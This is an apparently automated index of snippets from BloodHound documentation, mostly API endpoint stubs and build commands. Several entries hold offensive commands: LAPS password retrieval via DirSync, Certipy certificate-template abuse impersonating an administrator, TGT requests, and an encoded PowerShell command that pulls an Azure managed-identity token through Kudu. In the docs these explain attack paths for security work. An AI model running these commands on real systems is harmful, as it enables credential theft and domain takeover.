'image' and 'border' node types in Sigmajs. This node type is from an unmerged PR in the Sigmajs repository.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/src/rendering/RENDERING.md#2025-04-23_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ngraph.addNode(key, {\n    x: 10,\n    y: 20,\n    size: 30,\n    type: 'combined',\n    borderColor: '#000000',\n    image: './icons/computer.svg'\n});\n```\n\n----------------------------------------\n\nTITLE: St Bernard Command with Options\nDESCRIPTION: Demonstrates the correct order of options and subcommands when running St Bernard, with verbose debugging enabled for the test command.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/stbernard/README.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ go run github.com/specterops/bloodhound/packages/go/stbernard -vv test -g\n```\n\n----------------------------------------\n\nTITLE: PATCH /api/v2/bloodhound-users/{user_id} OpenAPI Specification\nDESCRIPTION: OpenAPI route definition for updating Bloodhound user details via PATCH method. The endpoint includes a user_id path parameter for identifying the target user record.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/update-a-user.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /api/v2/bloodhound-users/{user_id}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition - GET Job Logs\nDESCRIPTION: OpenAPI specification defining the endpoint to retrieve logs for a specific job by its ID. The endpoint path includes a job_id parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/jobs/get-job-log-file.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/jobs/{job_id}/log\n```\n\n----------------------------------------\n\nTITLE: Installing BloodHound Helm Chart\nDESCRIPTION: Command to install the BloodHound Community Edition helm chart in a Kubernetes cluster. Requires helm to be properly configured with the correct kubeconfig context.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/examples/helm/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ helm install bhce $BH_ROOT/examples/helm/.\n```\n\n----------------------------------------\n\nTITLE: Footer Examples for Issue Linking\nDESCRIPTION: Shows various formats for linking issues and tickets in commit message footers.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-2.md#2025-04-23_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\nCloses #1111\\n\\nFixes BED-5555\\n\\nresolves: #777\\n\\nCLOSES: #1, resolves #2, Fix: BED-4444\n```\n\n----------------------------------------\n\nTITLE: Beagle CLI Usage Output\nDESCRIPTION: Displays the command-line interface options and arguments for Beagle, including available actions and flags.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nusage: beagle [-h] [-c] [-a] [-v] [-i] {test}\n\nBeagle: the BloodHound build, test and packaging automation framework.\n\npositional arguments:\n  {test}             action for beagle to pursue\n\noptions:\n  -h, --help         show this help message and exit\n  -c, --ci           informs beagle that it is running in a CI container\n  -a, --all-tests    run all tests regardless of staged changes\n  -v, --verbose      enable extra output\n  -i, --integration  enable integration tests\n```\n\n----------------------------------------\n\nTITLE: Configuring AzureHound Start Command in Windows Scheduled Task\nDESCRIPTION: Command line argument to start AzureHound Enterprise collector with a specific configuration file. This allows the scheduled task to target the correct tenant-specific configuration when running the collector.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/multiple-collectors.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nstart -c \"C:\\\\AzureHound\\\\dumpster-tenant\\\\config.json\"\n```\n\n----------------------------------------\n\nTITLE: BloodHound Development Access URL\nDESCRIPTION: URL endpoint for accessing the BloodHound UI in development mode with default admin credentials.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/DEVREADME.md#2025-04-23_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nhttp://bloodhound.localhost\n```\n\n----------------------------------------\n\nTITLE: Retrieving Meta Nodes OpenAPI Endpoint Definition\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves meta nodes for a specified domain ID. Part of the BloodHound Enterprise Edition API.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/analysis/get-latest-tier-zero-combo-node.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/meta-nodes/{domain_id}\n```\n\n----------------------------------------\n\nTITLE: Retrieving DCOM Rights for a Computer in BloodHound API v2\nDESCRIPTION: API endpoint for fetching DCOM rights associated with a specific computer object. The endpoint requires the computer's object_id as a path parameter and returns the DCOM rights data.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-dcom-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/dcom-rights\n```\n\n----------------------------------------\n\nTITLE: Setting Up Python Virtual Environment for Beagle Development\nDESCRIPTION: Instructions for creating a Python virtual environment and installing required development tools for Beagle.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npython3 -m venv ~/beagle_venv\n\n~/beagle_venv/bin/pip install --upgrade pip black mypy\n```\n\n----------------------------------------\n\nTITLE: Configuring BloodHound Docker Compose Volumes\nDESCRIPTION: This YAML snippet shows how to uncomment volume configuration in the docker-compose.yml file to use a custom bloodhound.config.json file.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/examples/docker-compose/README.md#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nvolumes:\n    - ./bloodhound.config.json:/bloodhound.config.json:ro\n```\n\n----------------------------------------\n\nTITLE: Creating Kubernetes TLS Secret for AzureHound\nDESCRIPTION: Creates a Kubernetes TLS secret for AzureHound Enterprise using certificate and key files.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nkubectl create secret tls azurehound-tls --cert=<path to cert> --key=<path to key>\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Path Definition for Client Task Creation\nDESCRIPTION: OpenAPI specification defining the POST endpoint for creating tasks for a specific client ID. The path includes API version v2 and client identifier parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/creates-a-scheduled-task.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/clients/{client_id}/tasks\n```\n\n----------------------------------------\n\nTITLE: Retrieving LAPS Password Using DirSync\nDESCRIPTION: PowerShell command to synchronize and retrieve the LAPS password for a specific target computer using DirSync capabilities. This command allows retrieval of confidential attributes like ms-Mcs-AdmPwd.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sync-laps-password.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nSync-LAPS -LDAPFilter '(samaccountname=TargetComputer$)'\n```\n\n----------------------------------------\n\nTITLE: St Bernard Subcommand Help\nDESCRIPTION: Example of how to get help for a specific subcommand (test) in St Bernard.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/stbernard/README.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ go run github.com/specterops/bloodhound/packages/go/stbernard test -h\n```\n\n----------------------------------------\n\nTITLE: Displaying Upstream Checkout Hash for python-semver\nDESCRIPTION: Provides the Git commit hash used for the vendored version of python-semver.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/beagle/semver/README.md#2025-04-23_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n1e3283abb8407ccea925347950c42f6a1431b31b\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint - SSO Provider Signing Certificate\nDESCRIPTION: OpenAPI specification for an endpoint that retrieves the signing certificate for a specific SSO provider using their unique identifier.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/get-saml-provider-signing-certificate.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/sso-providers/{sso_provider_id}/signing-certificate\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition for BloodHound Collectors\nDESCRIPTION: OpenAPI specification defining the endpoint structure for retrieving BloodHound collector information based on collector type parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/collectors/get-collector-manifest.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/collectors/{collector_type}\n```\n\n----------------------------------------\n\nTITLE: Apache 2.0 License Notice for BloodHound\nDESCRIPTION: The license notice for BloodHound Community Edition, specifying that it's licensed under Apache License 2.0. It includes copyright information and conditions for usage of the software.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/README.md#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nCopyright 2025 Specter Ops, Inc.\n\nLicensed under the Apache License, Version 2.0\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Retrieving Permission Details by ID in BloodHound API\nDESCRIPTION: OpenAPI specification for the GET endpoint that fetches a specific permission by its ID. This endpoint allows retrieving detailed information about a permission using its unique identifier.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/permissions/get-permission.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/permissions/{permission_id}\n```\n\n----------------------------------------\n\nTITLE: Formatting Beagle Source Code with Black\nDESCRIPTION: Command to format the Beagle source code using the Black code formatter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n# From bhce source root\ncd packages/python/beagle\n\n~/beagle_venv/bin/black ./ \n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for GET /api/v2/jobs/current Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for retrieving current jobs in BloodHound. The endpoint is accessible via GET /api/v2/jobs/current and is available only in the Enterprise Edition.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/jobs/get-client-current-job.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/jobs/current\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Saved Queries in BloodHound API\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /api/v2/saved-queries endpoint. It specifies the route for retrieving saved queries in the BloodHound application.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cypher/list-saved-queries.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/saved-queries\n```\n\n----------------------------------------\n\nTITLE: Retrieving Custom Selectors for an Asset Group in BloodHound\nDESCRIPTION: API endpoint specification for retrieving custom selectors associated with a specific asset group. The endpoint accepts an asset_group_id parameter in the URL path to identify which asset group's custom selectors to retrieve.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/get-asset-group-custom-member-count.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/asset-groups/{asset_group_id}/custom-selectors\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate as Victim Computer Using Certipy in Windows\nDESCRIPTION: This command uses Certipy to request enrollment in the affected certificate template as the victim computer, specifying the target Enterprise CA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe req -u VICTIM$ -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Delete Asset Group OpenAPI Endpoint Definition\nDESCRIPTION: API endpoint specification for deleting an existing asset group identified by asset_group_id from the BloodHound system. Uses DELETE HTTP method.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/delete-an-asset-group.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/asset-groups/{asset_group_id}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Data Pipe Status in BloodHound API\nDESCRIPTION: This OpenAPI specification defines the GET endpoint for retrieving the status of the data pipe functionality in BloodHound. The endpoint is located at /api/v2/datapipe/status and appears to be available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/datapipe/get-datapipe-status.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/datapipe/status\n```\n\n----------------------------------------\n\nTITLE: OpenAPI PUT Endpoint Definition for Attack Paths\nDESCRIPTION: OpenAPI specification defining the PUT endpoint for managing attack paths in BloodHound Enterprise API v2\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/attack-paths/start-analysis.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: put /api/v2/attack-paths\n```\n\n----------------------------------------\n\nTITLE: Using START Clause for Node Operations\nDESCRIPTION: Shows how to use START clause to begin query execution from specific nodes and find paths.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_35\n\nLANGUAGE: cypher\nCODE:\n```\nSTART V = node(*)\nMATCH P = (T:Label)-[*]->(V)\nWHERE T.Target = true\nRETURN P\n```\n\n----------------------------------------\n\nTITLE: Retrieving GPO Tier Zero Information - OpenAPI Endpoint Definition\nDESCRIPTION: OpenAPI specification for a GET endpoint that allows retrieving tier zero information for a specific Group Policy Object (GPO) using its object ID. The endpoint follows the /api/v2/gpos/{object_id}/tier-zero pattern.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/gpos/get-gpo-entity-tier-zero.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/gpos/{object_id}/tier-zero\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Pathfinding in BloodHound\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint used for pathfinding operations in BloodHound. The endpoint is '/api/v2/pathfinding' and is part of the v2 API.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/graph/get-pathfinding-result.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/pathfinding\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Events in OpenAPI\nDESCRIPTION: Specifies the OpenAPI definition for the GET /api/v2/events endpoint. This endpoint is likely used to retrieve event data in BloodHound Enterprise.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/events-schedules/list-events.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/events\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for SQL Admins Retrieval in BloodHound\nDESCRIPTION: This YAML snippet defines the API endpoint pattern for retrieving SQL administrators associated with a specific computer in BloodHound. The endpoint follows the RESTful pattern '/api/v2/computers/{object_id}/sql-admins' and uses GET method.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-sql-admins.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/sql-admins\n```\n\n----------------------------------------\n\nTITLE: Creating Certipy Executable using PyInstaller\nDESCRIPTION: Creates a standalone Windows executable version of Certipy using PyInstaller from the project's root directory\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npyinstaller ./Certipy.spec\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint for Domain Attack Path Findings\nDESCRIPTION: OpenAPI specification for endpoint that retrieves attack path findings for a specific domain. The endpoint requires a domain_id parameter in the path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/attack-paths/export-attack-path-findings.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{domain_id}/attack-path-findings\n```\n\n----------------------------------------\n\nTITLE: Deleting User MFA in Bloodhound via OpenAPI Endpoint\nDESCRIPTION: OpenAPI specification for a DELETE endpoint that removes multi-factor authentication for a specific Bloodhound user identified by their user_id parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/unenroll-user-from-multi-factor-authentication.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/bloodhound-users/{user_id}/mfa\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition for Asset Group Combo Node\nDESCRIPTION: OpenAPI specification defining the GET endpoint path for retrieving combo node data associated with a specific asset group ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/analysis/get-the-combo-tree-for-an-asset-group.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/asset-groups/{asset_group_id}/combo-node\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE Endpoint for Events in BloodHound OpenAPI\nDESCRIPTION: OpenAPI specification for the DELETE endpoint that removes a specific event by its ID. This endpoint is available only in the Enterprise Edition of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/events-schedules/delete-event.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/events/{event_id}\n```\n\n----------------------------------------\n\nTITLE: GET Endpoint for Computer Controllers\nDESCRIPTION: OpenAPI specification for the endpoint that retrieves controllers for a specified computer object. The endpoint accepts a computer object ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Defining Resource Cards in Markdown\nDESCRIPTION: This snippet creates a card group with individual cards for different sections of the BloodHound documentation. Each card has a title and a link to the corresponding resource page.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/overview.mdx#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n<CardGroup>\n <Card title=\"Nodes\" href=\"/resources/nodes/overview\" />\n <Card title=\"Edges\" href=\"/resources/edges/overview\" />\n <Card title=\"Glossary\" href=\"/resources/glossary\" />\n <Card title=\"Community and Support\" href=\"/resources/community-support/overview\" />\n <Card title=\"Release Notes\" href=\"/resources/release-notes/overview\" />\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Displaying Upstream License for python-semver\nDESCRIPTION: Shows the full text of the BSD 3-Clause License used by the python-semver library.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/beagle/semver/README.md#2025-04-23_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nCopyright (c) 2013, Konstantine Rybnikov\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n  Redistributions of source code must retain the above copyright notice, this\n  list of conditions and the following disclaimer.\n\n  Redistributions in binary form must reproduce the above copyright notice, this\n  list of conditions and the following disclaimer in the documentation and/or\n  other materials provided with the distribution.\n\n  Neither the name of the {organization} nor the names of its\n  contributors may be used to endorse or promote products derived from\n  this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR\nANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON\nANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n```\n\n----------------------------------------\n\nTITLE: GET Client Endpoint Definition - OpenAPI\nDESCRIPTION: OpenAPI specification for retrieving client information by client_id. Endpoint path follows RESTful conventions for accessing a specific client resource.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/get-client.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/clients/{client_id}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Object Controllers API Endpoint Definition in OpenAPI\nDESCRIPTION: This endpoint retrieves controllers for a specified object in BloodHound's AI/ACA context. It requires an object_id parameter to identify the target object.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/aia-cas/get-aia-ca-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/aiacas/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate Enrollment with Certipy (Linux)\nDESCRIPTION: This command uses Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc1.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local\n```\n\n----------------------------------------\n\nTITLE: Defining GET User Admin Rights Endpoint in OpenAPI\nDESCRIPTION: API endpoint specification for retrieving admin rights associated with a user. The endpoint accepts a user object_id as a path parameter and returns the administrative permissions for that user.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-admin-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/admin-rights\n```\n\n----------------------------------------\n\nTITLE: Rendering Compliance Resource Cards with JSX\nDESCRIPTION: A CardGroup component containing multiple Card components that link to different compliance framework resources. Each card includes a title, icon, and link to detailed documentation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/manage-bloodhound/compliance-framework/overview.mdx#2025-04-23_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<CardGroup cols={2}>\n  <Card\n    title=\"BloodHound Enterprise Compliance Framework Resource\"\n    icon=\"shield-check\"\n    href=\"/manage-bloodhound/compliance-framework/resources\"\n    iconType=\"solid\"\n    horizontal\n  />\n  <Card\n    title=\"BloodHound Enterprise NIST SP 800-171 Compliance Resource\"\n    icon=\"file-shield\"\n    href=\"/manage-bloodhound/compliance-framework/nist-sp-800-171\"\n    iconType=\"solid\"\n    horizontal\n  />\n  <Card\n    title=\"BloodHound Enterprise NIST SP 800-53 Rev.8 Compliance Resource\"\n    icon=\"clipboard-check\"\n    href=\"/manage-bloodhound/compliance-framework/nist-sp-800-53\"\n    iconType=\"solid\"\n    horizontal\n  />\n  <Card\n    title=\"BloodHound Enterprise NIST CSF v2 Compliance Resource\"\n    icon=\"clipboard\"\n    href=\"/manage-bloodhound/compliance-framework/nist-csf-v2\"\n    iconType=\"solid\"\n    horizontal\n  />\n  <Card\n    title=\"BloodHound Enterprise NIST CSF v1.1 Compliance Resource\"\n    icon=\"check-double\"\n    href=\"/manage-bloodhound/compliance-framework/nist-csf-v1-1\"\n    iconType=\"solid\"\n    horizontal\n  />\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Retrieving Managed Identity JWT from Web App\nDESCRIPTION: Complex example showing how to retrieve a JWT for a managed identity Service Principal from a Web App using PowerShell commands and base64 encoding.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-website-contributor.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nPS C:\\> $PowerShellCommand =\n        $headers=@{\"X-IDENTITY-HEADER\"=$env:IDENTITY_HEADER}\n        $response = Invoke-WebRequest -UseBasicParsing -Uri \"$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01\" -Headers $headers\n        $response.RawContent\n\nPS C:\\> $base64Cmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PowerShellCommand))\n\nPS C:\\> $Command = \"powershell -enc $($base64Cmd)\"\n\nPS C:\\> Invoke-AzureRMWebAppShellCommand `\n        -KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `\n        -token $ARMToken `\n        -Command $Command\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for BloodHound Analysis Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the PUT /api/v2/analysis endpoint in BloodHound. It specifies the endpoint path and HTTP method for running custom analysis queries.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/datapipe/start-analysis.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: put /api/v2/analysis\n```\n\n----------------------------------------\n\nTITLE: Retrieving AD Domain Data Quality Statistics API Endpoint in BloodHound\nDESCRIPTION: This OpenAPI endpoint specification defines a GET request to retrieve data quality statistics for a specified Active Directory domain. The endpoint path parameter requires a domain_id to identify the specific domain for which to fetch statistics.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/data-quality/get-ad-domain-data-quality-stats.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/ad-domains/{domain_id}/data-quality-stats\n```\n\n----------------------------------------\n\nTITLE: Defining PUT Endpoint for Updating Saved Queries in BloodHound\nDESCRIPTION: This OpenAPI specification defines the endpoint for updating an existing saved query identified by its ID. The endpoint uses the PUT HTTP method with the saved query ID provided as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cypher/update-a-saved-query.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: put /api/v2/saved-queries/{saved_query_id}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Domain Meta-Trees via REST API in BloodHound Enterprise\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves meta information about trees for a specific domain. The endpoint requires a domain_id parameter in the path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/analysis/get-the-graph-for-meta-tree.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/meta-trees/{domain_id}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI POST Endpoint for Client Registration\nDESCRIPTION: OpenAPI specification defining the POST endpoint at /api/v2/clients for registering and managing BloodHound clients. This endpoint is specific to the Enterprise Edition.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/create-client.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: post /api/v2/clients\n```\n\n----------------------------------------\n\nTITLE: GET Domain Inbound Trusts OpenAPI Endpoint\nDESCRIPTION: OpenAPI specification for the GET endpoint that returns inbound trust relationships for a domain. The endpoint requires a domain object ID parameter in the URL path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-inbound-trusts.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/inbound-trusts\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Certificate on Linux using Certipy\nDESCRIPTION: Uses Certipy on Linux to request a Ticket Granting Ticket from the domain using the obtained certificate. This completes the authentication process to gain access as a member of the target group.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc13.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx john.pfx -dc-ip 172.16.126.128\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition for User Controllables\nDESCRIPTION: Defines the REST API endpoint for retrieving entities that are controllable by a specific user identified by their object_id parameter. The API path uses the format '/api/v2/users/{object_id}/controllables'.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-controllables.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/controllables\n```\n\n----------------------------------------\n\nTITLE: Defining PUT Endpoint for Client Token Regeneration in BloodHound API\nDESCRIPTION: This OpenAPI specification describes the endpoint for regenerating client tokens. The endpoint path includes a client_id parameter to identify which client's token should be regenerated.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/regenerate-the-authentication-token-for-a-client.mdx#2025-04-23_snippet_0\n\nLANGUAGE: 